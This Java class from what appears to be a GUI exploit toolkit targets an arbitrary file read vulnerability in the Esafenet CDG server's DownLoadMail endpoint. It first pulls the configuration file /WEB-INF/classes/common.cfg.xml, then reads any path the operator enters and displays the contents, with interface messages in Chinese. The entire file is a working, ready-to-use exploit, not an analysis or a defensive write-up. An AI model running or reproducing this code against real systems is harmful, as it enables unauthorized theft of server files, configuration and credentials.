package exp.oa.esafenet;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.io.File;
import java.util.HashMap;

public class esafenet_DownLoadMail_FileRead implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 不支持getshell功能");
        });
        return false;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {

        try {
            HashMap<String, String> head = new HashMap<>();
            String postdata ="path=/WEB-INF/classes/&name=common.cfg.xml";
            Response res = HttpTools.post(url + "/CDGServer3/esafenet/DownLoadMail",postdata, new HashMap<>(), "utf-8");
            if (res.getCode() == 200 && res.getText().contains("<") && !res.getText().isEmpty()) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ esafenet_DownLoadMail_FileRead ]");
                    textArea.appendText("\n 输入文件名进行读取");
                    textArea.appendText("\n eg: /WEB-INF/classes/common.cfg.xml");
                    textArea.appendText("\n");
                    textArea_cmd.appendText("\n -------------"+"/WEB-INF/classes/common.cfg.xml"+"--------------\n"+res.getText()+"\n");
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {

        try {
            String var = new File(cmd).getName();
            String var1 = cmd.replace(var,"");
            String postdata = "path="+var1+"&name="+var;
            Response res = HttpTools.post(url + "/CDGServer3/esafenet/DownLoadMail",postdata, new HashMap<>(), "utf-8");

            if (res.getCode() == 200&& res.getText()!="") {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 读取成功！");
                    textArea_cmd.appendText("\n -------------"+cmd+"--------------\n"+res.getText()+"\n");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 读取失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_UploadServlet_serial-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
